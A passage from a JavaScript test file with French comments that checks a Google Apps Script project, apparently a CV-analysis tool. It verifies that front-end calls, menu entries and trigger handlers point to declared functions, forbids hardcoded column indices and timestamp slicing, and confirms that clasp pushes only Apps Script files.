  // jusqu'au premier appel qui n'en est pas un : c'est la cible.
  // Les commentaires sont sautés : une apostrophe dans « // on cesse d'interroger »
  // passerait sinon pour le début d'une chaîne, et le contrôle se tromperait.
  const sauterParentheses = (texte, i) => {
    let profondeur = 0;
    let guillemet = null;
    for (; i < texte.length; i++) {
      const c = texte[i];
      if (guillemet) {
        if (c === '\\') i++;
        else if (c === guillemet) guillemet = null;
      } else if (c === '/' && texte[i + 1] === '/') {
        i = texte.indexOf('\n', i);
        if (i === -1) break;
      } else if (c === '/' && texte[i + 1] === '*') {
        i = texte.indexOf('*/', i + 2) + 1;
        if (i === 0) break;
      } else if (c === '"' || c === "'" || c === '`') {
        guillemet = c;
      } else if (c === '(') {
        profondeur++;
      } else if (c === ')') {
        profondeur--;
        if (profondeur === 0) return i + 1;
      }
    }
    throw new Error('parenthèse non fermée');
  };
  const cibles = new Set();
  let debut = html.indexOf('google.script.run');
  while (debut !== -1) {
    let i = debut + 'google.script.run'.length;
    for (;;) {
      const m = /^\s*\.\s*([A-Za-z_$][\w$]*)\s*\(/.exec(html.slice(i));
      if (!m) break;
      if (/^with(SuccessHandler|FailureHandler|UserObject)$/.test(m[1])) {
        i = sauterParentheses(html, i + m[0].length - 1);
      } else {
        cibles.add(m[1]);
        break;
      }
    }
    debut = html.indexOf('google.script.run', debut + 1);
  }
  assert.ok(cibles.size >= 10, `le contrôle ne voit plus les appels (${[...cibles]})`);
  const declarees = new Set([...sourcesGs().matchAll(/^function\s+([A-Za-z_$][\w$]*)/gm)].map((x) => x[1]));
  cibles.forEach((cible) => {
    assert.ok(!cible.endsWith('_'), `${cible} finit par « _ » : inappelable depuis le navigateur`);
    assert.ok(declarees.has(cible), `${cible} n'est pas une fonction déclarée`);
  });
});

test('Contrôle : chaque entrée du menu vise une fonction déclarée', () => {
  const { f, g } = charger();
  f('onOpen')();
  const entrees = g.journal.menus.flatMap((m) => m.entrees);
  assert.ok(entrees.length >= 12, 'le menu n\'est plus lu');
  const declarees = new Set([...sourcesGs().matchAll(/^function\s+([A-Za-z_$][\w$]*)/gm)].map((x) => x[1]));
  entrees.forEach(({ fonction }) => assert.ok(declarees.has(fonction), `${fonction} absente`));
  ['analyzeCVsAutomated', f('CONTINUATION_TRIGGER_HANDLER')].forEach((cible) => assert.ok(declarees.has(cible), `cible de déclencheur ${cible} absente`));
});

test('Contrôle : aucune découpe d\'horodatage, aucun indice de colonne en dur', () => {
  const code = sansCommentaires(sourcesGs());
  assert.ok(code.length > 1000);
  assert.ok(!/String\([^)]*\)\.slice\(0,\s*10\)/.test(code));
  assert.ok(!/COL_INDEX/.test(code), 'les colonnes se retrouvent par en-tête');
});

test('Contrôle : clasp ne pousse que le code Apps Script', () => {
  const ignore = fs.readFileSync(path.join(RACINE, '.claspignore'), 'utf8');
  assert.ok(ignore.split('\n').includes('**/**'), 'tout doit être ignoré par défaut');
  ['!*.gs', '!*.html', '!appsscript.json'].forEach((motif) => assert.ok(ignore.includes(motif), motif));
  assert.ok(!ignore.includes('!banc'), 'le banc ne doit pas partir chez Google');
});

/* ------------------------------ Exécution ------------------------------ */

let echecs = 0;
cas.forEach(({ nom, fn }) => {
  try {
    fn();
    console.log(`✅ ${nom}`);
  } catch (e) {
    echecs++;
    console.log(`❌ ${nom}\n   ${e.stack.split('\n').slice(0, 4).join('\n   ')}`);
  }
});
console.log(`\n${cas.length - echecs}/${cas.length} cas réussis.`);
process.exit(echecs ? 1 : 0);
